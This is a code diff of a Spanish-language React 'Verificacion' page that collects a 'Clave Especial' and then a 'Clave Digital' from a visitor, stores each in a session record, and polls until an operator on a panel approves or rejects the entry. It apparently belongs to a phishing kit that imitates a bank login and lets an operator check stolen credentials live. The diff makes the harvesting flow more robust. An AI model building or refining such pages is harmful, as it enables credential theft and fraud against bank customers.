@@ -1,54 +1,78 @@
 import { useState, useEffect, useRef } from "react";
+import { useSearchParams } from "react-router-dom";
 import LoginHeader from "../components/LoginHeader";
 import { base44 } from "@/api/base44Client";
 
 export default function Verificacion() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const sessionId = urlParams.get("sessionId");
+  const [searchParams] = useSearchParams();
+  const sessionId = searchParams.get("sessionId");
 
-  // Fase 1: clave especial | Fase 2: clave digital
-  const [phase, setPhase] = useState("claveEspecial"); // "claveEspecial" | "waitingApproval" | "claveDigital" | "done"
+  // "claveEspecial" | "waitingApproval" | "rejected" | "claveDigital" | "done"
+  const [phase, setPhase] = useState("claveEspecial");
   const [claveEspecial, setClaveEspecial] = useState("");
   const [claveDigital, setClaveDigital] = useState("");
+  const [submitting, setSubmitting] = useState(false);
   const pollRef = useRef(null);
 
   useEffect(() => {
     return () => { if (pollRef.current) clearInterval(pollRef.current); };
   }, []);
 
-  // Fase 1: el usuario envía la clave especial
+  // Fase 1: enviar clave especial
   const handleSubmitClaveEspecial = async () => {
-    if (!claveEspecial.trim() || !sessionId) return;
+    if (!claveEspecial.trim() || !sessionId || submitting) return;
+    setSubmitting(true);
 
-    await base44.entities.UserSessionData.update(sessionId, {
-      claveEspecial: claveEspecial.trim(),
-      claveEspecialStatus: "pending",
-    });
+    try {
+      // Guardar clave especial
+      await base44.entities.UserSessionData.update(sessionId, {
+        claveEspecial: claveEspecial.trim(),
+      });
+      // Marcar como pendiente para que aparezca el botón en el panel
+      await base44.entities.UserSessionData.update(sessionId, {
+        claveEspecialStatus: "pending",
+      });
+    } catch (e) {
+      console.error("Error guardando clave especial:", e);
+      setSubmitting(false);
+      return;
+    }
 
+    setSubmitting(false);
     setPhase("waitingApproval");
 
     // Pollear hasta que el admin apruebe o rechace
     pollRef.current = setInterval(async () => {
-      const res = await base44.entities.UserSessionData.filter({ id: sessionId });
-      const s = res[0];
-      if (!s) return;
-      if (s.claveEspecialStatus === "approved") {
-        clearInterval(pollRef.current);
-        setPhase("claveDigital");
-      } else if (s.claveEspecialStatus === "rejected") {
-        clearInterval(pollRef.current);
-        setClaveEspecial("");
-        setPhase("rejected");
-      }
+      try {
+        const res = await base44.entities.UserSessionData.filter({ id: sessionId });
+        const s = res[0];
+        if (!s) return;
+        if (s.claveEspecialStatus === "approved") {
+          clearInterval(pollRef.current);
+          setPhase("claveDigital");
+        } else if (s.claveEspecialStatus === "rejected") {
+          clearInterval(pollRef.current);
+          setClaveEspecial("");
+          setPhase("rejected");
+        }
+      } catch (_) {}
     }, 3000);
   };
 
-  // Fase 2: el usuario envía la clave digital
+  // Fase 2: enviar clave digital
   const handleSubmitClaveDigital = async () => {
-    if (!claveDigital.trim() || !sessionId) return;
-    await base44.entities.UserSessionData.update(sessionId, {
-      claveDigital: claveDigital.trim(),
-    });
+    if (!claveDigital.trim() || !sessionId || submitting) return;
+    setSubmitting(true);
+    try {
+      await base44.entities.UserSessionData.update(sessionId, {
+        claveDigital: claveDigital.trim(),
+      });
+    } catch (e) {
+      console.error("Error guardando clave digital:", e);
+      setSubmitting(false);
+      return;
+    }
+    setSubmitting(false);
     setPhase("done");
   };
 
@@ -93,12 +117,7 @@ export default function Verificacion() {
 
             {/* Fila Clave Especial */}
             <div style={{ display: "flex", alignItems: "center", borderBottom: "1px solid #b0bec5", background: "#dce8f0" }}>
-              <div style={{
-                width: "260px", minWidth: "260px",
-                padding: "10px 16px",
-                fontSize: "14px", fontWeight: "bold", color: "#121212",
-                borderRight: "1px solid #b0bec5",
-              }}>
+              <div style={{ width: "260px", minWidth: "260px", padding: "10px 16px", fontSize: "14px", fontWeight: "bold", color: "#121212", borderRight: "1px solid #b0bec5" }}>
                 Clave Especial
               </div>
               <div style={{ flex: 1, padding: "6px 12px" }}>
@@ -108,13 +127,8 @@ export default function Verificacion() {
                   onChange={(e) => isPhase1 && setClaveEspecial(e.target.value.replace(/\s/g, ""))}
                   disabled={!isPhase1}
                   style={{
-                    width: "140px",
-                    border: "1px solid #90a4ae",
-                    borderRadius: "2px",
-                    padding: "4px 8px",
-                    fontSize: "14px",
-                    outline: "none",
-                    fontFamily: "inherit",
+                    width: "140px", border: "1px solid #90a4ae", borderRadius: "2px",
+                    padding: "4px 8px", fontSize: "14px", outline: "none", fontFamily: "inherit",
                     background: !isPhase1 ? "#f0f0f0" : "white",
                     color: !isPhase1 ? "#999" : "#121212",
                     cursor: !isPhase1 ? "not-allowed" : "text",
@@ -125,12 +139,7 @@ export default function Verificacion() {
 
             {/* Fila Clave Digital */}
             <div style={{ display: "flex", alignItems: "center", background: "#dce8f0" }}>
-              <div style={{
-                width: "260px", minWidth: "260px",
-                padding: "10px 16px",
-                fontSize: "14px", fontWeight: "bold", color: "#121212",
-                borderRight: "1px solid #b0bec5",
-              }}>
+              <div style={{ width: "260px", minWidth: "260px", padding: "10px 16px", fontSize: "14px", fontWeight: "bold", color: "#121212", borderRight: "1px solid #b0bec5" }}>
                 Clave Digital
               </div>
               <div style={{ flex: 1, padding: "6px 12px" }}>
@@ -145,14 +154,8 @@ export default function Verificacion() {
                   }}
                   disabled={phase !== "claveDigital"}
                   style={{
-                    width: "140px",
-                    border: "1px solid #90a4ae",
-                    borderRadius: "2px",
-                    padding: "4px 8px",
-                    fontSize: "14px",
-                    outline: "none",
-                    fontFamily: "inherit",
-                    letterSpacing: "2px",
+                    width: "140px", border: "1px solid #90a4ae", borderRadius: "2px",
+                    padding: "4px 8px", fontSize: "14px", outline: "none", fontFamily: "inherit", letterSpacing: "2px",
                     background: phase !== "claveDigital" ? "#f0f0f0" : "white",
                     color: phase !== "claveDigital" ? "#999" : "#121212",
                     cursor: phase !== "claveDigital" ? "not-allowed" : "text",
@@ -166,33 +169,33 @@ export default function Verificacion() {
           <div style={{ textAlign: "center" }}>
             {isPhase1 ? (
               <button
-                disabled={!claveEspecial.trim()}
+                disabled={!claveEspecial.trim() || submitting}
                 onClick={handleSubmitClaveEspecial}
                 style={{
                   padding: "11px 52px", fontSize: "15px",
-                  background: claveEspecial.trim() ? "#1973B8" : "#d6d6d6",
-                  color: claveEspecial.trim() ? "white" : "#999",
+                  background: claveEspecial.trim() && !submitting ? "#1973B8" : "#d6d6d6",
+                  color: claveEspecial.trim() && !submitting ? "white" : "#999",
                   border: "none", borderRadius: "4px",
-                  cursor: claveEspecial.trim() ? "pointer" : "not-allowed",
+                  cursor: claveEspecial.trim() && !submitting ? "pointer" : "not-allowed",
                   fontFamily: "inherit", transition: "all 0.2s",
                 }}
               >
-                Continuar
+                {submitting ? "Enviando..." : "Continuar"}
               </button>
             ) : (
               <button
-                disabled={!claveDigitalValid}
+                disabled={!claveDigitalValid || submitting}
                 onClick={handleSubmitClaveDigital}
                 style={{
                   padding: "11px 52px", fontSize: "15px",
-                  background: claveDigitalValid ? "#1973B8" : "#d6d6d6",
-                  color: claveDigitalValid ? "white" : "#999",
+                  background: claveDigitalValid && !submitting ? "#1973B8" : "#d6d6d6",
+                  color: claveDigitalValid && !submitting ? "white" : "#999",
                   border: "none", borderRadius: "4px",
-                  cursor: claveDigitalValid ? "pointer" : "not-allowed",
+                  cursor: claveDigitalValid && !submitting ? "pointer" : "not-allowed",
                   fontFamily: "inherit", transition: "all 0.2s",
                 }}
               >
-                Continuar
+                {submitting ? "Enviando..." : "Continuar"}
               </button>
             )}
           </div>
